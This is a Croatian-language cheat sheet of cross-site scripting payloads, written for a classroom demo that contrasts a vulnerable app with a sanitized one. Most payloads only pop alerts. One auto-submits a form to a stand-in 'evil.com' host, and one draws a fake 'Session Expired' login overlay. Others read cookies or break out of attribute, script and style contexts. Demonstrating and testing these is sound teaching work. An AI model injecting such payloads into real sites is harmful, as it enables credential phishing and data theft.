# 🎯 XSS Test Payloadi za Prezentaciju

Ovaj dokument sadrži različite XSS payloade koje možeš koristiti tijekom prezentacije za demonstraciju ranjivosti.

---

## 📝 Osnovni Payloadi

### 1. Simple Alert
**Opis:** Najjednostavniji XSS test  
**Payload:**
```html
<script>alert('XSS!')</script>
```
**Očekivano:** Alert box s porukom "XSS!"

---

### 2. Cookie Stealing (Simulacija)
**Opis:** Demonstrira kako napadač može pristupiti cookies  
**Payload:**
```html
<script>alert('Cookie: ' + document.cookie)</script>
```
**Očekivano:** Alert box prikazuje sve cookies

---

### 3. Image XSS
**Opis:** XSS putem onerror event handlera  
**Payload:**
```html
<img src=x onerror="alert('Image XSS!')">
```
**Očekivano:** Alert box kad se slika ne učita

---

### 4. SVG XSS
**Opis:** XSS putem SVG elementa  
**Payload:**
```html
<svg onload="alert('SVG XSS!')"></svg>
```
**Očekivano:** Alert box pri učitavanju SVG-a

---

## 🔥 Napredniji Payloadi

### 5. Inline Event Handler
**Payload:**
```html
<div onmouseover="alert('Hover XSS!')">Prođi mišem preko mene</div>
```
**Očekivano:** Alert kad korisnik pređe mišem

---

### 6. Body XSS
**Payload:**
```html
<body onload="alert('Body XSS!')">
```
**Očekivano:** Alert pri učitavanju stranice

---

### 7. IFrame Injection
**Payload:**
```html
<iframe src="javascript:alert('IFrame XSS!')"></iframe>
```
**Očekivano:** Alert iz iframe-a

---

### 8. Redirect Attack
**Opis:** Demonstrira kako napadač može preusmjeriti korisnika  
**Payload:**
```html
<script>window.location='https://example.com'</script>
```
**Očekivano:** Preusmjeravanje na drugu stranicu

---

### 9. Form Hijacking
**Payload:**
```html
<form action="https://evil.com/steal"><input type="text" name="data" value="secret"></form><script>document.forms[0].submit()</script>
```
**Očekivano:** Forma se automatski submitta na malicioznu stranicu

---

### 10. DOM Manipulation
**Payload:**
```html
<script>document.body.innerHTML = '<h1>HACKED!</h1>'</script>
```
**Očekivano:** Cijela stranica se zamijeni s "HACKED!"

---

## 💡 Kreativni Payloadi za Wow Efekt

### 11. Fake Login Form
**Payload:**
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;display:flex;justify-content:center;align-items:center">
<form style="background:white;padding:40px;border-radius:10px">
<h2>Session Expired - Please Login</h2>
<input type="text" placeholder="Username" style="display:block;margin:10px;padding:10px;width:250px">
<input type="password" placeholder="Password" style="display:block;margin:10px;padding:10px;width:250px">
<button style="display:block;margin:10px auto;padding:10px 30px;background:#007bff;color:white;border:none;border-radius:5px">Login</button>
</form></div>
```
**Očekivano:** Lažna login forma preko cijele stranice

---

### 12. Keylogger (Simulacija)
**Payload:**
```html
<script>
document.addEventListener('keypress', function(e) {
    alert('Key pressed: ' + e.key);
});
</script>
<p>Pokušaj pisati nešto...</p>
```
**Očekivano:** Alert za svaku pritisnutu tipku

---

### 13. Screen Shake
**Payload:**
```html
<script>
setInterval(function() {
    document.body.style.transform = 'rotate(' + (Math.random() * 10 - 5) + 'deg)';
}, 100);
</script>
```
**Očekivano:** Stranica se trese

---

### 14. Matrix Effect
**Payload:**
```html
<script>
document.body.style.backgroundColor = 'black';
document.body.innerHTML = '<canvas id="c"></canvas>';
var c = document.getElementById('c');
c.width = window.innerWidth;
c.height = window.innerHeight;
var ctx = c.getContext('2d');
var matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%";
matrix = matrix.split("");
var drops = [];
for(var x = 0; x < c.width; x += 10)
    drops[x] = 1;
function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
    ctx.fillRect(0, 0, c.width, c.height);
    ctx.fillStyle = '#0F0';
    ctx.font = '15px arial';
    for(var i = 0; i < drops.length; i++) {
        var text = matrix[Math.floor(Math.random()*matrix.length)];
        ctx.fillText(text, i*10, drops[i]*10);
        if(drops[i]*10 > c.height && Math.random() > 0.975)
            drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 35);
</script>
```
**Očekivano:** Matrix falling text effect

---

## 🎭 Payloadi za Različite Kontekste

### 15. HTML Attribute Context
**Payload:**
```html
" onload="alert('Attribute XSS!')"
```
**Koristi:** U input poljima koja se stavljaju kao atributi

---

### 16. JavaScript Context
**Payload:**
```javascript
'; alert('JS Context XSS!'); var x='
```
**Koristi:** Kada se input stavlja unutar <script> taga

---

### 17. CSS Context
**Payload:**
```html
</style><script>alert('CSS XSS!')</script><style>
```
**Koristi:** Kada se input stavlja unutar <style> taga

---

## 📊 Testiranje po Redu za Prezentaciju

### **DEMO 1: Ranjiva Verzija**

1. **Uvod** - Objasni što je XSS
   ```html
   <script>alert('Pozdrav polaznicima!')</script>
   ```

2. **Cookie Access** - Pokaži pristup podacima
   ```html
   <script>alert('Pristup cookies: ' + document.cookie)</script>
   ```

3. **DOM Manipulation** - Pokaži moć napada
   ```html
   <script>document.body.style.backgroundColor = 'red'; alert('Promijenio sam boje!');</script>
   ```

4. **Image XSS** - Alternativni pristup
   ```html
   <img src=x onerror="alert('Još jedan način!')">
   ```

### **DEMO 2: Sigurna Verzija**

Koristi **ISTE payloade** i pokaži kako se:
- Ne izvršavaju
- Prikazuju kao obični tekst
- Backend ih je sanitizirao

---

## 🔍 Provjera Učinkovitosti Zaštite

Nakon što pokažeš sigurnu verziju, isprobaj:

1. ✅ Simple script tag - trebao bi biti enkodiran
2. ✅ Image onerror - trebao bi biti uklonjen
3. ✅ SVG onload - trebao bi biti uklonjen
4. ✅ Event handlers - trebali bi biti uklonjeni

---

## 💡 Savjeti za Prezentaciju

### Redoslijed Demonstracije

1. **Pokreni jedan bezopasan payload** (simple alert) - uvod
2. **Pokreni jedan "strašniji"** (DOM manipulation) - pokaži moć
3. **Objasni kod** u IntelliJ-u - edukacija
4. **Pokažu sigurnu verziju** - rješenje
5. **Ponovno testirati** iste payloade - validacija

### Timing

- **Svaki payload:** ~2 minute
- **Code walkthrough:** ~5 minuta
- **Q&A:** ~5 minuta
- **Ukupno:** ~30 minuta za kompletnu demo

---

## ⚠️ VAŽNA NAPOMENA

**Ovi payloadi su ISKLJUČIVO za edukacijske svrhe!**

Nikada ne koristi ove tehnike na:
- Produkcijskim sustavima
- Tuđim aplikacijama bez dozvole
- U maliciozne svrhe

XSS napadi su **ILEGALNI** ako se koriste bez dozvole!

---

## 📚 Dodatni Resursi za Payloade

- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HTML5 Security Cheatsheet](https://html5sec.org/)

---

**Sretno s prezentacijom! 🎉**
